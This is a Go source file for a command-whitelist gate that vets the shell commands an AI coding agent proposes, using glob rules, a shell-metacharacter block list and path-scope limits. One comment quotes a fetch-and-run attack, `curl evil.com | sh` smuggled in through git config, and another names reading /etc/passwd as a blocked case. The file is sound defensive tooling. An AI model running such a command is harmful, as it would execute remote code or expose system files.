// Package gate is the command whitelist enforcement layer. The gate
// binary (cmd/gate) is invoked by claude's PreToolUse hook with the
// proposed Bash command on stdin; this package supplies the matcher
// + log helpers it uses.
//
// Files:
//   - rule.go         — CommandRule struct + Matcher (glob match,
//                        shell-metachar guard, scope prefix)
//   - log.go          — commands.jsonl append helper
//   - claude_hook.go  — settings.json generator + temp-dir setup
//   - embed.go        — gate-binary resolver (env / embed / sibling /
//                        PATH) + per-app branding via AppName ldflag
//
// Importers: cmd/gate (binary), pool/factory.go (settings path
// generator), tests.
package gate

import (
	"errors"
	"fmt"
	"path/filepath"
	"strings"
)

// CommandRule is one whitelist entry. Pattern is a simple glob:
//
//	"ls *"       → "ls" + any args
//	"git status" → exact "git status"
//	"cat *"      → "cat" + any args
//
// Glob is intentionally simple (one trailing `*` for "any args"). We
// don't support full filename globbing — that would let `rm *` match
// `rm -rf /` because `*` in the pattern is treated literal.
//
// Scope (optional) restricts argument paths to a prefix. With
// Scope="/workspace", "cat /workspace/foo" allowed but
// "cat /etc/passwd" blocked. Empty scope = no path restriction.
type CommandRule struct {
	Pattern string `json:"pattern"`
	Scope   string `json:"scope,omitempty"`
}

// Matcher decides allow/block per command. Built from a list of
// rules; wraps them with the shell-metachar guard from §15.1 so a
// rule like "git *" can't be exploited via `git config core.editor
// 'curl evil.com | sh'`.
type Matcher struct {
	rules []CommandRule
}

// NewMatcher returns a Matcher with the given rules.
func NewMatcher(rules []CommandRule) *Matcher {
	return &Matcher{rules: rules}
}

// Decide reports whether the command is allowed. Returns:
//
//   - allow=true,  reason=""               → permitted
//   - allow=false, reason=<short message>  → block
//
// Reason is suitable for logging into commands.jsonl. Caller (the
// gate binary) chooses the CLI-specific block signal (exit 2 for
// claude, JSON deny for codex/gemini).
func (m *Matcher) Decide(command string) (bool, string) {
	cmd := strings.TrimSpace(command)
	if cmd == "" {
		return false, "empty command"
	}
	if hasShellMetachar(cmd) {
		return false, "shell metacharacter blocked"
	}
	args, err := splitCommand(cmd)
	if err != nil {
		return false, "unparseable: " + err.Error()
	}
	for _, r := range m.rules {
		if !matchPattern(r.Pattern, args) {
			continue
		}
		if r.Scope != "" && !argsWithinScope(args[1:], r.Scope) {
			continue
		}
		return true, ""
	}
	return false, "no matching whitelist rule"
}

// hasShellMetachar rejects commands containing characters that allow
// chaining or substitution. Mitigation for §15.1 — even an exact
// "git *" match must not let the args sneak in `;`, `|`, etc.
//
// We check the FULL command string (not per-arg) so quoted
// metacharacters are also caught. Conservative by design.
func hasShellMetachar(cmd string) bool {
	const blocked = ";|&`<>$\n\r"
	if strings.ContainsAny(cmd, blocked) {
		return true
	}
	// $( and `` are caught by the byte set above; defensive double-check.
	if strings.Contains(cmd, "$(") || strings.Contains(cmd, "`") {
		return true
	}
	return false
}

// splitCommand splits a shell-ish command into argv WITHOUT honoring
// quotes (we already rejected dangerous metachars; quotes are
// allowed but stripped here for matching). Whitespace separates
// tokens.
func splitCommand(cmd string) ([]string, error) {
	fields := strings.Fields(cmd)
	if len(fields) == 0 {
		return nil, errors.New("no tokens")
	}
	out := make([]string, 0, len(fields))
	for _, f := range fields {
		out = append(out, strings.Trim(f, `"'`))
	}
	return out, nil
}

// matchPattern matches `args` (already split) against a rule pattern.
// Pattern grammar:
//
//   - Tokens separated by whitespace
//   - A trailing `*` token means "rest of args allowed"
//   - Otherwise exact token-by-token equality
//
// Examples:
//
//	"ls *"       matches ["ls", "-la"]                    → true
//	"git status" matches ["git", "status"]                 → true
//	"git status" matches ["git", "status", "--porcelain"]  → false
//	"cat"        matches ["cat", "foo"]                    → false
func matchPattern(pattern string, args []string) bool {
	pat := strings.Fields(pattern)
	if len(pat) == 0 {
		return false
	}
	if pat[len(pat)-1] == "*" {
		head := pat[:len(pat)-1]
		if len(args) < len(head) {
			return false
		}
		for i, p := range head {
			if p != args[i] {
				return false
			}
		}
		return true
	}
	if len(pat) != len(args) {
		return false
	}
	for i, p := range pat {
		if p != args[i] {
			return false
		}
	}
	return true
}

// argsWithinScope checks that any arg looking like a filesystem path
// stays under the scope prefix. Non-path-looking args (flags,
// options) pass through. We resolve relative paths against scope so
// callers don't have to pre-canonicalize.
//
// Heuristic for "looks like a path": starts with `/`, `\\`, `./`,
// `../`, drive letter, or contains a slash. Plain identifiers
// ("status", "diff") are not paths.
func argsWithinScope(args []string, scope string) bool {
	scope = filepath.Clean(scope)
	for _, a := range args {
		if !looksLikePath(a) {
			continue
		}
		abs := a
		// Treat leading-slash as absolute on every OS — claude
		// command args use POSIX-style paths even on Windows, and
		// Windows filepath.IsAbs("/etc/passwd") returns false.
		isAbs := filepath.IsAbs(a) || strings.HasPrefix(a, "/")
		if !isAbs {
			abs = filepath.Join(scope, a)
		}
		abs = filepath.Clean(abs)
		if !pathHasPrefix(abs, scope) {
			return false
		}
	}
	return true
}

func looksLikePath(s string) bool {
	if s == "" {
		return false
	}
	if strings.ContainsAny(s, `/\`) {
		return true
	}
	if len(s) >= 3 && s[1] == ':' && (s[2] == '\\' || s[2] == '/') {
		return true
	}
	if strings.HasPrefix(s, ".") {
		return true
	}
	return false
}

// pathHasPrefix is filepath.HasPrefix without the deprecation. Cleans
// both sides + ensures the boundary is at a separator so /a/bc isn't
// considered a child of /a/b.
func pathHasPrefix(p, prefix string) bool {
	p = filepath.Clean(p)
	prefix = filepath.Clean(prefix)
	if p == prefix {
		return true
	}
	if !strings.HasPrefix(p, prefix) {
		return false
	}
	// Boundary check.
	rest := p[len(prefix):]
	return rest != "" && (rest[0] == filepath.Separator || rest[0] == '/' || rest[0] == '\\')
}

// Validate reports whether a rule is well-formed. Used by config
// validation before persisting rules into the configs table.
func (r CommandRule) Validate() error {
	if strings.TrimSpace(r.Pattern) == "" {
		return fmt.Errorf("empty pattern")
	}
	if hasShellMetachar(r.Pattern) {
		return fmt.Errorf("pattern contains shell metacharacter")
	}
	return nil
}
